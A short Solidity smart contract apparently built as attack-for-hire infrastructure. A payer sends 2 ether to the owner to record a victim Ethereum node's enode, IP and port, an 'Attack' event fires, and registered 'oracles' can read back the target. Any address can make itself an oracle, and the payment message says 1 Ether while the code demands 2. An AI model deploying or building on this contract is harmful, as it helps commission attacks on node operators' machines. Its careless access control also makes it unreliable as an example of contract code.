pragma solidity >=0.4.21 <0.6.0;

contract ASC{
   string private victimEnode;
   string private victimIP;
   string private victimPort;
   address private owner;
   mapping (address => bool) private oracles;
   event Attack(
     string msg
   );

   constructor() public{
     owner = msg.sender;
     
   }

   modifier oraclesCheck() {
     require(oracles[msg.sender] == true);
     _;
   }

   modifier payment() {
     require(msg.value == 2 ether,"Amount should be equal to 1 Ether");
     _;
   }

   function register() public{
     if(oracles[msg.sender] == false) oracles[msg.sender] = true;
   }

   function set(string _victimEnode, string _victimIP, string _victimPort ) public payment{
      owner.transfer(2 ether);
      victimEnode = _victimEnode;
      victimIP = _victimIP;
      victimPort = _victimPort;
      emit Attack('attack');
   }

   function get() public view oraclesCheck returns(string, string, string){
      return (victimEnode, victimIP, victimPort);
   }

}
